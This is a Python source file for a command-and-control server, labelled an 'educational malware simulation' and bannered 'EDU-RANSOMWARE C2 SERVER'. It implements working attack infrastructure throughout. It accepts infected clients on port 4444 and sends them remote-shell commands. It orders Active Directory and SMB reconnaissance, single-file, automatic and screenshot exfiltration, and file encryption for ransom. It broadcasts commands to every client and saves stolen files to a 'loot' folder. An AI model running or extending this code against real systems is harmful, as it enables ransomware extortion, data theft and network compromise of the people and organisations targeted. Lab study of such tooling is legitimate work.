"""Command-and-control (C2) server for the educational malware simulation."""

import base64
import binascii
import os
import socket
import sys
import threading
from pathlib import Path
from typing import Dict, Optional, Tuple

LOOT_DIR = Path("loot")
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 4444
SOCKET_BACKLOG = 5
RECV_CHUNK_SIZE = 1_048_576
MAX_INLINE_RESPONSE_BYTES = 2_000
TRUNCATED_RESPONSE_PREVIEW_BYTES = 200


class Colors:
    """ANSI color codes for terminal output formatting."""

    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"


clients: Dict[int, socket.socket] = {}
client_id = 0
lock = threading.Lock()
shutdown_event = threading.Event()


def _print_prompt() -> None:
    print("C2>", end="", flush=True)


def _ensure_loot_dir() -> None:
    LOOT_DIR.mkdir(parents=True, exist_ok=True)


def _disconnect_client(cid: int) -> None:
    with lock:
        clients.pop(cid, None)


def _close_all_clients() -> None:
    with lock:
        open_sockets = list(clients.values())
        clients.clear()

    for client_socket in open_sockets:
        try:
            client_socket.close()
        except OSError:
            continue


def _parse_client_id(value: str) -> Optional[int]:
    try:
        return int(value)
    except ValueError:
        print("[!] Client ID must be a number")
        return None


def _parse_exfil_message(data: str) -> Tuple[str, bytes]:
    exfil_start = data.find("EXFIL_DATA:")
    if exfil_start == -1:
        raise ValueError("Missing EXFIL_DATA prefix")

    payload = data[exfil_start:].strip()
    parts = payload.split(":", 2)
    if len(parts) != 3:
        raise ValueError(f"Invalid EXFIL format: expected 3 parts, got {len(parts)}")

    _, filename, b64_content = parts
    safe_filename = os.path.basename(filename.strip())
    if not safe_filename:
        raise ValueError("Empty filename in EXFIL payload")

    decoded_data = base64.b64decode(b64_content.strip(), validate=False)
    return safe_filename, decoded_data


def _save_exfil_data(data: str) -> None:
    filename, decoded_data = _parse_exfil_message(data)
    _ensure_loot_dir()

    save_path = LOOT_DIR / filename
    with save_path.open("wb") as loot_file:
        loot_file.write(decoded_data)

    print(
        f"{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! "
        f"Saved to: {save_path} ({len(decoded_data)} bytes){Colors.ENDC}"
    )


def parse_recon_report(data: str) -> None:
    """Parse and format a `RECON_DATA` payload for readable console output."""

    marker = "RECON_DATA:AD_STRUCTURE:"
    if marker not in data:
        print(f"\n{Colors.HEADER}[RECON RESPONSE]{Colors.ENDC}")
        print(data)
        print()
        return

    recon_section = data.split(marker, 1)[1]
    recon_data = {}
    for part in recon_section.split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        recon_data[key] = value

    print(
        f"\n{Colors.BOLD}{Colors.HEADER}"
        "==============================================="
    )
    print("        NETWORK RECONNAISSANCE REPORT")
    print(f"===============================================\n{Colors.ENDC}")

    domain = recon_data.get("DOMAIN")
    if domain:
        print(f"{Colors.BLUE}[*] Domain:{Colors.ENDC} {domain}")

    admins = recon_data.get("ADMINS", "")
    if admins:
        admin_items = [item for item in admins.split(",") if item]
        print(f"{Colors.BLUE}[*] Domain Admins ({len(admin_items)}):{Colors.ENDC}")
        for admin in admin_items[:10]:
            print(f"    - {admin}")
        if len(admin_items) > 10:
            print(f"    ... and {len(admin_items) - 10} more")

    computers = recon_data.get("COMPUTERS", "")
    if computers:
        computer_items = [item for item in computers.split(",") if item]
        print(f"{Colors.BLUE}[*] Computers ({len(computer_items)}):{Colors.ENDC}")
        for computer in computer_items[:10]:
            print(f"    - {computer}")
        if len(computer_items) > 10:
            print(f"    ... and {len(computer_items) - 10} more")

    shares = recon_data.get("SHARES", "")
    if shares:
        share_items = [item for item in shares.split(",") if item]
        print(f"{Colors.GREEN}[*] SMB Shares ({len(share_items)}):{Colors.ENDC}")
        for share in share_items[:15]:
            print(f"    - {share}")
        if len(share_items) > 15:
            print(f"    ... and {len(share_items) - 15} more")

    high_value_targets = recon_data.get("HVT", "")
    if high_value_targets:
        target_items = [item for item in high_value_targets.split(",") if item]
        print(
            f"{Colors.WARNING}{Colors.BOLD}[!] High-Value Targets "
            f"({len(target_items)}):{Colors.ENDC}"
        )
        for target in target_items:
            print(f"    - {target}")

    print(f"\n{Colors.BOLD}{'-' * 47}{Colors.ENDC}\n")


def handle_client(
    client_socket: socket.socket, client_address: Tuple[str, int], cid: int
) -> None:
    """Handle all incoming messages for one connected client in a dedicated thread."""

    print(f"{Colors.GREEN}[+] New connection: ID {cid} from {client_address}{Colors.ENDC}")
    with lock:
        clients[cid] = client_socket

    exfil_buffer = ""
    is_exfil_only_connection = False

    try:
        while not shutdown_event.is_set():
            try:
                chunk_bytes = client_socket.recv(RECV_CHUNK_SIZE)
            except OSError as error:
                print(f"[!] Socket error with client ID {cid}: {error}")
                break

            if not chunk_bytes:
                break

            chunk = chunk_bytes.decode("utf-8", errors="ignore")

            if exfil_buffer:
                exfil_buffer += chunk
                if len(chunk_bytes) == RECV_CHUNK_SIZE:
                    continue
                data = exfil_buffer
                exfil_buffer = ""
            elif "EXFIL_DATA" in chunk:
                is_exfil_only_connection = True
                exfil_buffer = chunk
                if len(chunk_bytes) == RECV_CHUNK_SIZE:
                    continue
                data = exfil_buffer
                exfil_buffer = ""
            else:
                data = chunk

            if "RECON_DATA" in data:
                parse_recon_report(data)
                _print_prompt()
                continue

            if "EXFIL_DATA" in data:
                try:
                    print(
                        f"\n{Colors.WARNING}[*] Processing exfiltrated payload...{Colors.ENDC}"
                    )
                    _save_exfil_data(data)
                    _print_prompt()
                except (ValueError, binascii.Error, OSError) as error:
                    print(
                        f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {error}"
                        f"{Colors.ENDC}"
                    )
                    print(f"[!] Payload length: {len(data)}")
                continue

            if len(data) > MAX_INLINE_RESPONSE_BYTES:
                preview = data[:TRUNCATED_RESPONSE_PREVIEW_BYTES]
                print(
                    f"\n[ID {cid}] Response (truncated):\n"
                    f"{preview}...\n"
                    f"[... {len(data)} bytes hidden ...]"
                )
            else:
                print(f"\n[ID {cid}] Response:\n{data}")
            _print_prompt()

        if exfil_buffer:
            try:
                _save_exfil_data(exfil_buffer)
            except (ValueError, binascii.Error, OSError) as error:
                print(f"{Colors.FAIL}[!] Could not persist exfil data: {error}{Colors.ENDC}")

    finally:
        _disconnect_client(cid)
        try:
            client_socket.close()
        except OSError:
            pass

        if not is_exfil_only_connection:
            print(f"[-] Client ID {cid} disconnected")


def broadcast_command(command: str) -> None:
    """Send a command to all currently connected clients."""

    encoded_command = command.encode("utf-8")
    with lock:
        current_clients = list(clients.items())

    for cid, client_socket in current_clients:
        try:
            client_socket.send(encoded_command)
            print(f"[+] Command sent to ID {cid}")
        except OSError as error:
            print(f"{Colors.FAIL}[!] Failed sending to ID {cid}: {error}{Colors.ENDC}")


def send_command_to_client(cid: int, command: str) -> bool:
    """Send a command to one client by ID and report whether it succeeded."""

    with lock:
        client_socket = clients.get(cid)

    if client_socket is None:
        print(f"{Colors.WARNING}[!] Client ID {cid} not found{Colors.ENDC}")
        return False

    try:
        client_socket.send(command.encode("utf-8"))
        print(f"[+] Command sent to ID {cid}")
        return True
    except OSError as error:
        print(f"{Colors.FAIL}[!] Failed sending to ID {cid}: {error}{Colors.ENDC}")
        return False


def kill_client(cid: int) -> None:
    """Send the `kill` command to one client to remove persistence and process state."""

    if send_command_to_client(cid, "kill"):
        print(f"[+] Kill command sent to ID {cid}")


def encrypt_target(cid: int, target_path: str) -> None:
    """Send an `encrypt <path>` command to the selected client."""

    encrypt_command = f"encrypt {target_path}"
    if send_command_to_client(cid, encrypt_command):
        print(f"[+] Encrypt command for '{target_path}' sent to ID {cid}")


def decrypt_target(cid: int, target_path: Optional[str] = None) -> None:
    """Send a decrypt command to a client, optionally scoped to one path."""

    command = f"decrypt {target_path}" if target_path else "decrypt"
    if send_command_to_client(cid, command):
        if target_path:
            print(f"[+] Decrypt command for '{target_path}' sent to ID {cid}")
        else:
            print(f"[+] Default decrypt command sent to ID {cid}")


def list_sessions() -> None:
    """Print all active sessions with ID and peer IP address when available."""

    with lock:
        current_clients = list(clients.items())

    if not current_clients:
        print("[!] No active sessions")
        return

    print("[*] Active sessions:")
    for cid, client_socket in current_clients:
        try:
            peer_ip = client_socket.getpeername()[0]
        except OSError:
            peer_ip = "unknown"
        print(f"\tID {cid} - {peer_ip}")


def _print_help() -> None:
    print(f"{Colors.HEADER}[*] Available commands:{Colors.ENDC}")
    print("  sessions                       - Show all active sessions")
    print("  interact <id>                  - Open interactive shell for one client")
    print("  recon <id>                     - Start AD/SMB reconnaissance")
    print("  exfil <id> <remote_path>       - Download one file from client")
    print("  auto-exfil <id>                - Exfiltrate high-value files automatically")
    print("  exfil-screenshot <id>          - Exfiltrate one screenshot")
    print("  encrypt <id> <path>            - Encrypt target path on one client")
    print("  decrypt <id> [path]            - Decrypt files on one client")
    print("  kill <id>                      - Send kill command to one client")
    print("  broadcast <cmd>                - Send command to all clients")
    print("  help                           - Show command reference")
    print("  exit                           - Shutdown C2 server")


def _run_interactive_client_shell(cid: int) -> None:
    with lock:
        client_exists = cid in clients
    if not client_exists:
        print(f"{Colors.WARNING}[!] Client ID {cid} not found{Colors.ENDC}")
        return

    print(
        f"{Colors.HEADER}[*] Interacting with ID {cid}. "
        f"Type 'background' to return.{Colors.ENDC}"
    )

    while not shutdown_event.is_set():
        try:
            sub_command = input(f"ID {cid} @ Shell> ").strip()
        except EOFError:
            print()
            return

        if not sub_command:
            continue
        if sub_command == "background":
            return

        if sub_command.startswith("encrypt "):
            _, target_path = sub_command.split(" ", 1)
            encrypt_target(cid, target_path)
            continue

        if sub_command == "decrypt":
            decrypt_target(cid)
            continue

        if sub_command.startswith("decrypt "):
            _, target_path = sub_command.split(" ", 1)
            decrypt_target(cid, target_path)
            continue

        if sub_command.startswith("exfil "):
            send_command_to_client(cid, sub_command)
            print(f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}")
            continue

        if sub_command == "auto-exfil":
            send_command_to_client(cid, "auto-exfil")
            print(
                f"{Colors.WARNING}[*] Auto-exfil started on client {cid}.{Colors.ENDC}"
            )
            continue

        if sub_command == "exfil-screenshot":
            send_command_to_client(cid, "exfil-screenshot")
            print(f"{Colors.WARNING}[*] Screenshot exfil started on ID {cid}.{Colors.ENDC}")
            continue

        if sub_command == "recon":
            send_command_to_client(cid, "recon")
            print(
                f"{Colors.HEADER}[*] Network reconnaissance started on ID {cid}."
                f"{Colors.ENDC}"
            )
            continue

        if sub_command == "kill":
            kill_client(cid)
            continue

        send_command_to_client(cid, sub_command)


def _handle_broadcast(command: str) -> None:
    if command.startswith("encrypt "):
        _, target_path = command.split(" ", 1)
        broadcast_command(f"encrypt {target_path}")
        print(f"[+] Encrypt command for '{target_path}' sent to all clients")
        return

    if command == "decrypt":
        broadcast_command("decrypt")
        print("[+] Decrypt command sent to all clients")
        return

    if command == "auto-exfil":
        broadcast_command("auto-exfil")
        print(f"{Colors.WARNING}[+] Auto-exfil sent to all clients{Colors.ENDC}")
        return

    if command == "exfil-screenshot":
        broadcast_command("exfil-screenshot")
        print(f"{Colors.WARNING}[+] Screenshot exfil sent to all clients{Colors.ENDC}")
        return

    if command == "recon":
        broadcast_command("recon")
        print(f"{Colors.HEADER}[+] Recon command sent to all clients{Colors.ENDC}")
        return

    broadcast_command(command)


def server_shell() -> None:
    """Run the interactive C2 command shell for operator input and dispatch."""

    _ensure_loot_dir()
    print(f"{Colors.BOLD}--- C2 COMMAND CENTER READY ---{Colors.ENDC}")

    while not shutdown_event.is_set():
        try:
            command = input("C2> ").strip()
        except EOFError:
            print()
            shutdown_event.set()
            break

        if not command:
            continue

        if command == "sessions":
            list_sessions()
            continue

        if command.startswith("interact "):
            parts = command.split(" ", 1)
            cid = _parse_client_id(parts[1]) if len(parts) == 2 else None
            if cid is not None:
                _run_interactive_client_shell(cid)
            continue

        if command.startswith("encrypt "):
            parts = command.split(" ", 2)
            if len(parts) != 3:
                print("[!] Usage: encrypt <client_id> <target_path>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                encrypt_target(cid, parts[2])
            continue

        if command.startswith("kill "):
            parts = command.split(" ", 1)
            if len(parts) != 2:
                print("[!] Usage: kill <client_id>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                kill_client(cid)
            continue

        if command.startswith("decrypt "):
            parts = command.split(" ", 2)
            if len(parts) not in (2, 3):
                print("[!] Usage: decrypt <client_id> [path]")
                continue
            cid = _parse_client_id(parts[1])
            if cid is None:
                continue
            if len(parts) == 3:
                decrypt_target(cid, parts[2])
            else:
                decrypt_target(cid)
            continue

        if command.startswith("broadcast "):
            payload = command[len("broadcast ") :].strip()
            if not payload:
                print("[!] Usage: broadcast <command>")
                continue
            _handle_broadcast(payload)
            continue

        if command.startswith("auto-exfil "):
            parts = command.split(" ", 1)
            if len(parts) != 2:
                print("[!] Usage: auto-exfil <client_id>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                send_command_to_client(cid, "auto-exfil")
                print(
                    f"{Colors.WARNING}[*] Auto-exfil started on client {cid}."
                    f"{Colors.ENDC}"
                )
            continue

        if command.startswith("exfil-screenshot "):
            parts = command.split(" ", 1)
            if len(parts) != 2:
                print("[!] Usage: exfil-screenshot <client_id>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                send_command_to_client(cid, "exfil-screenshot")
                print(
                    f"{Colors.WARNING}[*] Screenshot exfil started on client {cid}."
                    f"{Colors.ENDC}"
                )
            continue

        if command.startswith("exfil "):
            parts = command.split(" ", 2)
            if len(parts) != 3:
                print("[!] Usage: exfil <client_id> <remote_filepath>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                remote_path = parts[2]
                send_command_to_client(cid, f"exfil {remote_path}")
                print(
                    f"{Colors.WARNING}[*] Requesting '{remote_path}' from ID {cid}."
                    f"{Colors.ENDC}"
                )
            continue

        if command.startswith("recon "):
            parts = command.split(" ", 1)
            if len(parts) != 2:
                print("[!] Usage: recon <client_id>")
                continue
            cid = _parse_client_id(parts[1])
            if cid is not None:
                send_command_to_client(cid, "recon")
                print(
                    f"{Colors.HEADER}[*] Network reconnaissance started on ID {cid}."
                    f"{Colors.ENDC}"
                )
            continue

        if command == "help":
            _print_help()
            continue

        if command == "exit":
            print(f"{Colors.FAIL}[!] Shutting down...{Colors.ENDC}")
            shutdown_event.set()
            _close_all_clients()
            return

        print("[!] Unknown command. Type 'help'.")


def main() -> None:
    """Start the TCP C2 listener and spawn handler threads for incoming clients."""

    global client_id

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    except OSError as error:
        print(f"{Colors.FAIL}[!] Could not bind port {LISTEN_PORT}: {error}{Colors.ENDC}")
        return

    server_socket.listen(SOCKET_BACKLOG)
    server_socket.settimeout(1.0)

    print(f"[*] C2 server started on port {LISTEN_PORT}")
    print(f"{Colors.HEADER}========================================")
    print("    EDU-RANSOMWARE C2 SERVER")
    print(f"    Listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"========================================{Colors.ENDC}")

    shell_thread = threading.Thread(target=server_shell, daemon=True, name="c2-shell")
    shell_thread.start()

    try:
        while not shutdown_event.is_set():
            try:
                conn, addr = server_socket.accept()
            except socket.timeout:
                continue
            except OSError as error:
                if shutdown_event.is_set():
                    break
                print(f"{Colors.FAIL}[!] Accept failed: {error}{Colors.ENDC}")
                continue

            print("Client connected from", addr)
            print("Local IP used for this connection:", conn.getsockname()[0])

            with lock:
                client_id += 1
                cid = client_id

            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, cid),
                daemon=True,
                name=f"client-{cid}",
            )
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Shutting down server")
        shutdown_event.set()
    finally:
        _close_all_clients()
        try:
            server_socket.close()
        except OSError:
            pass
        sys.exit(0)


if __name__ == "__main__":
    main()
